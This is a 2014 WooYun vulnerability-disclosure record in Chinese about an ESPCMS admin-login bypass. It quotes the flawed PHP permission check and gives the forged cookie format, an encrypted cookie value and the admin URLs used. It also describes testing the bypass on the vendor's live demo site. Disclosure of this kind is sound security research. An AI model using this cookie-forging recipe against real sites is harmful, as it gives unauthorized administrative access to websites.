{"id": 48103, "wybug_id": "wooyun-2014-078329", "wybug_title": "ESPCMS 权限限定绕过直接登录后台(DEMO站测试通过)", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "JJ Fly", "wybug_date": "2014-10-08 10:59", "wybug_open_date": "2015-01-06 11:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-06：\t细节向公众公开  简要描述： ESPCMS 权限限定绕过直接登录后台仅测试了 最新版本 然后demo测试进去看了一眼，别的什么也没做。 详细说明：  先看下 后台验证的代码\nfunction softbase($admin_purview = false) {\theader(\"Content-Type: text/html; charset=utf-8\");\t$this->dbmysql();\t$this->commandinc();\t$this->systemfile();\t$this->cachedb();\tif ($admin_purview) {\t\t$this->admin_purview();\t\t$this->sitelng = $this->getlng();\t\t$action = $this->fun->accept('action', 'R');\t\tif (in_array($action, $this->esp_powerlist) && !in_array('all', $this->esp_powerlist)) {\t\t\texit('Permissions errors');\t\t}\t}\tif ($this->CON['is_gzip'] == 1 && !function_exists('ob_gzhandler')) {\t\tob_start('ob_gzhandler');\t} else {\t\tob_start();\t}\tif ($runpage && $this->CON['is_close']) {\t\texit($this->CON['close_content']);\t}\tif (!admin_FROM) {\t\tinclude admin_ROOT . adminfile . '/include/admin_language_' . db_lan . '.php';\t\t$this->lng = $ST;\t\tunset($ST);\t} else {\t\t$lngpack = (admin_LNG == 'big5') ? $this->CON['is_lancode'] : admin_LNG;\t\tif ($this->creat_lanpack($lngpack)) {\t\t\tinclude admin_ROOT . 'datacache/' . $lngpack . '_pack.php';\t\t}\t\t$this->lng = $LANPACK;\t\t$runpage = true;\t}}\n调用了下面的函数。$this->admin_purview();然后继续查看代码\nfunction admin_purview() {\tif ($this->fun->accept('archive', 'R') == 'filemanage' && $this->fun->accept('action', 'R') == 'batupfilesave') {\t\t$ecisp_admininfo = $this->fun->accept('ecisp_admininfo', 'C');\t\t$esp_powerlist = $this->fun->accept('esp_powerlist', 'C');\t\t$gettype = false;\t} else {\t\t$ecisp_admininfo = $this->fun->accept('ecisp_admininfo', 'C');\t\t$esp_powerlist = $this->fun->accept('esp_powerlist', 'C');\t\t$gettype = true;\t}\t$arr_purview = explode('|', $this->fun->eccode($ecisp_admininfo, 'DECODE', db_pscode));\t$this->esp_powerlist = explode('|', $this->fun->eccode($esp_powerlist, 'DECODE', db_pscode));\tlist($esp_adminuserid, $this->esp_username, $this->esp_password, $this->esp_useragent, $esp_powerid, $esp_inputclassid, $this->esp_softurl) = $arr_purview;\t$this->esp_adminuserid = intval($esp_adminuserid);\t$this->esp_inputclassid = intval($esp_inputclassid);\t$this->esp_powerid = intval($esp_powerid);\tif ($gettype) {\t\tif (empty($this->esp_username) || empty($this->esp_adminuserid) || md5(admin_AGENT) != $this->esp_useragent || md5(admin_ClassURL) != $this->esp_softurl) {\t\t\t\t\t\t$condition = 0;\t\t} else {\t\t\t$condition = 1;\t\t}\t} else {\t\tif (empty($this->esp_username) || empty($this->esp_adminuserid) || md5(admin_ClassURL) != $this->esp_softurl) {\t\t\t$condition = 0;\t\t} else {\t\t\t$condition = 1;\t\t}\t}\tif ($condition == 0) {\t\tif ($this->fun->accept('archive', 'R') != 'adminuser' && $this->fun->accept('action', 'R') != 'login') {\t\t\theader('location: index.php?archive=adminuser&action=login');\t\t\texit();\t\t}\t} else {\t\tif ($condition == 1 && $this->fun->accept('point', 'R') == '' && $this->fun->accept('archive', 'R') == '' && $this->fun->accept('action', 'R') == '') {\t\t\theader('location: index.php?archive=management&action=tab&loadfun=mangercenter&out=tabcenter');\t\t\texit();\t\t}\t}}\n然后重点验证的是下面的代码\nif (empty($this->esp_username) || empty($this->esp_adminuserid) || md5(admin_AGENT) != $this->esp_useragent || md5(admin_ClassURL) != $this->esp_softurl)\n$this->esp_username和$this->esp_adminuserid  可以在cookies中伪造。而后面的 两个常量如下\nadmin_AGENTdefine('admin_AGENT', $_SERVER['HTTP_USER_AGENT']);admin_ClassURLdefine('admin_ClassURL', 'http://' . $_SERVER['HTTP_HOST'] . substr($_SERVER['PHP_SELF'], 0, strrpos($_SERVER['PHP_SELF'], '/')) . '/');\n可见，可进行伪造。再来说下查看key直接可以看索马里大牛的http://wooyun.org/bugs/wooyun-2010-062528这里就不多说了。来张截图进行下示例。\n\n出来之后 然后挨个进行 加密解密测试。最终可以得出key   漏洞证明：  下面我们开始伪造cookies中ecisp_admininfo的加密前值如下。\n1|admin|md5(password)|md5(admin_AGENT)|1|1|md5(admin_ClassURL)\n下面我拿测试用的agent和classurl进行演示Mozilla/5.0 (Windows NT 6.3; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0加密之后efdd8e8dfc89de8875254f2e96f2eeb2http://192.168.1.107/adminsoft加密之后962c6fbd63e97c6d6db74449a6bef874password不进行验证，随便输入个wooyun 加密之后fbb204a4061ffbd41284a84c258c1bfb然后填充进去\n1|admin|fbb204a4061ffbd41284a84c258c1bfb|efdd8e8dfc89de8875254f2e96f2eeb2|1|1|962c6fbd63e97c6d6db74449a6bef874\n加密\nZq-XmKLPoa3LlJWUYpqVbWecaJybxspoZWRtZ5dsacllZp2VZMSYyLCencqbbpqcypqXam6Xm2xtnWhjmmaZlJefap9py5yYZ-CXsGWubmlol2vMlZWbZZibaclqnW3KmW1pmJptlWiXmJxsbJo\n然后我们可以得出cookies的设定值ecisp_admininfo 设定为Zq-XmKLPoa3LlJWUYpqVbWecaJybxspoZWRtZ5dsacllZp2VZMSYyLCencqbbpqcypqXam6Xm2xtnWhjmmaZlJefap9py5yYZ-CXsGWubmlol2vMlZWbZZibaclqnW3KmW1pmJptlWiXmJxsbJoesp_powerlist  设定为  all  的加密lp-imanagementloglistpgid  设定为0managementmangerlistpgid   设定为0开始进行伪造管理员我们先打开\nhttp://192.168.1.107/adminsoft/index.php\n这个页面 然后开始填充cookies\n\n然后访问下面的url\nhttp://192.168.1.107/adminsoft/index.php?archive=management&action=tab&loadfun=mangercenter&out=tabcenter\n\n\n好了下面我们来说下demo的先注册个帐号。\n\n然后 翻来覆去 获得keyb16dd02887<马赛克>eabab<马赛克>然后我们访问\nhttp://demo.ecisp.cn/adminsoft\n再生成cookies访问\nhttp://demo.ecisp.cn/adminsoft/index.php?archive=management&action=tab&loadfun=mangercenter&out=tabcenter\n\n\n   修复方案：     版权声明：转载请注明来源 JJ Fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-10-08 14:53 厂商回复： 感谢您的提供，我们会对系统进行相关修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-08 11:09 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  你关注的白帽子 JJ Fly 发表了漏洞 ESPCMS 权限限定绕过直接登录后台(DEMO站测试通过)    \n     2014-10-08 11:48 |    \t\tJJ Fly \t\t\t( 普通白帽子  |\t\t\t        Rank:317 漏洞数:59        | 今天播下一颗种子。)\t\t \n  @玉林嘎 大牛你好。    \n     2014-10-08 12:18 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  @JJ Fly 小菜一个    \n     2014-10-08 12:41 |    \t\tneal \t\t\t( 普通白帽子  |\t\t\t        Rank:219 漏洞数:23        )\t\t \n  之前的加密算法一直没改  我还能进呢,如果是加密的问题  我都不好意思发    \n     2014-10-08 12:57 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n   如果不是算法的话 是挺好的。    \n     2014-10-08 14:16 |    \t\tJJ Fly \t\t\t( 普通白帽子  |\t\t\t        Rank:317 漏洞数:59        | 今天播下一颗种子。)\t\t \n  @neal 大牛你好，我是小菜。这个漏洞跟加密算法有一定关系，key可被逆向这个大家都知道，但是还有他后台权限限制有缺陷，可被绕过的问题。如果你们之前都知道的话，那我这就算是给厂商提下醒吧。    \n     2014-10-08 14:16 |    \t\tJJ Fly \t\t\t( 普通白帽子  |\t\t\t        Rank:317 漏洞数:59        | 今天播下一颗种子。)\t\t \n  @′  雨。 雨神你好。初学审计，还望指点。。。。    \n     2015-01-06 20:53 |    \t\tMxx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 没有)\t\t \n  demo 没有搞懂。    \n     2015-01-06 21:05 |    \t\tJJ Fly \t\t\t( 普通白帽子  |\t\t\t        Rank:317 漏洞数:59        | 今天播下一颗种子。)\t\t \n  @Mxx 主要就是为了满足这句 if (empty($this->esp_username) || empty($this->esp_adminuserid) || md5(admin_AGENT) != $this->esp_useragent || md5(admin_ClassURL) != $this->esp_softurl)    \n     2015-01-06 21:21 |    \t\tMxx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 没有)\t\t \n  @JJ Fly 虽然没搞懂，但是谢了，起码回复我我这种菜鸟。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}